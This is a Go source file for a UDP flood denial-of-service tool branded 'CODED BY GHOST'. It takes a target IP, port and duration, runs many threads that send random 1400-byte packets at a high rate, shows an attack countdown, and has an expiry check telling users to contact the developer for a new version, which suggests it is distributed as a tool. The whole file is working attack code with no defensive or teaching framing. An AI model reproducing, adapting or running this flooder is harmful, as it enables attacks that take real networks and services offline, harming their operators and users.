package main

import (
 "fmt"
  "log"
   "math/rand"
    "net"
	 "os"
	  "os/signal"
	   "runtime"
	    "strconv"
		 "sync"
		  "syscall"
		   "time"
		   )

		   const (
		    packetSize    = 1400
			 chunkDuration = 280
			  expiryDate    = "2024-09-16T23:00:00"
			  )

			  func main() {
			   fmt.Println()
			    fmt.Println("*****************************************")
				 fmt.Println("CODED BY GHOST")
				  fmt.Println("*****************************************")

				   checkExpiry()

				    if len(os.Args) != 4 {
					  fmt.Println("Usage: ./ghost <target_ip> <target_port> <attack_duration>")
					    fmt.Println()
						  return
						   }

						    targetIP := os.Args[1]
							 targetPort := os.Args[2]
							  duration, err := strconv.Atoi(os.Args[3])
							   if err != nil || duration <= 0 {
							     fmt.Println("Invalid attack duration:", err)
								   return
								    }
									 durationTime := time.Duration(duration) * time.Second

									  numThreads := max(1, int(float64(runtime.NumCPU())*2.5))
									   packetsPerSecond := 1_000_000_000 / packetSize

									    var wg sync.WaitGroup
										 done := make(chan struct{})
										  signalChan := make(chan os.Signal, 1)
										   signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

										    go func() {
											  <-signalChan
											    close(done)
												 }()

												  go countdown(durationTime, done)

												   for i := 0; i < numThreads; i++ {
												     wg.Add(1)
													   go func() {
													      defer wg.Done()

														     conn, err := createConnection(targetIP, targetPort)
															    if err != nil {
																    log.Printf("Error creating UDP connection: %v\n", err)
																	    return
																		   }
																		      defer cleanup(conn)

																			     sendUDPPackets(conn, packetsPerSecond/numThreads, durationTime, done)
																				   }()
																				    }

																					 wg.Wait()
																					  close(done)
																					  }

																					  func checkExpiry() {
																					   currentDate := time.Now()
																					    expiry, err := time.Parse("2006-01-02T15:04:05", expiryDate)
																						 if err != nil {
																						   fmt.Println("Error parsing expiry date:", err)
																						     os.Exit(1)
																							  }

																							   if currentDate.After(expiry) {
																							     fmt.Println("This script has expired. Please contact the developer for a new version.")
																								   os.Exit(1)
																								    }
																									}

																									func createConnection(ip, port string) (*net.UDPConn, error) {
																									 addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%s", ip, port))
																									  if err != nil {
																									    return nil, err
																										 }

																										  conn, err := net.DialUDP("udp", nil, addr)
																										   if err != nil {
																										     return nil, err
																											  }
																											   return conn, nil
																											   }

																											   func cleanup(conn *net.UDPConn) {
																											    if conn != nil {
																												  conn.Close()
																												   }
																												   }

																												   func sendUDPPackets(conn *net.UDPConn, packetsPerSecond int, duration time.Duration, done chan struct{}) {
																												    packet := generatePacket(packetSize)
																													 interval := time.Second / time.Duration(packetsPerSecond)
																													  deadline := time.Now().Add(duration)

																													   for time.Now().Before(deadline) {
																													     select {
																														   case <-done:
																														      return
																															    default:
																																   _, err := conn.Write(packet)
																																      if err != nil {
																																	      log.Printf("Error sending UDP packet: %v\n", err)
																																		      return
																																			     }
																																				    time.Sleep(interval)
																																					  }
																																					   }
																																					   }

																																					   func countdown(duration time.Duration, done chan struct{}) {
																																					    ticker := time.NewTicker(1 * time.Second)
																																						 defer ticker.Stop()

																																						  for remainingTime := duration; remainingTime > 0; remainingTime -= time.Second {
																																						    select {
																																							  case <-ticker.C:
																																							     fmt.Printf("\rTime remaining: %s", remainingTime.String())
																																								   case <-done:
																																								      fmt.Println("\rAttack interrupted.")
																																									     return
																																										   }
																																										    }
																																											 fmt.Println("\rTime remaining: 0s")
																																											 }

																																											 func generatePacket(size int) []byte {
																																											  packet := make([]byte, size)
																																											   for i := 0; i < size; i++ {
																																											     packet[i] = byte(rand.Intn(256))
																																												  }
																																												   return packet
																																												   }

																																												   func max(x, y int) int {
																																												    if x > y {
																																													  return x
																																													   }
																																													    return y
																																														}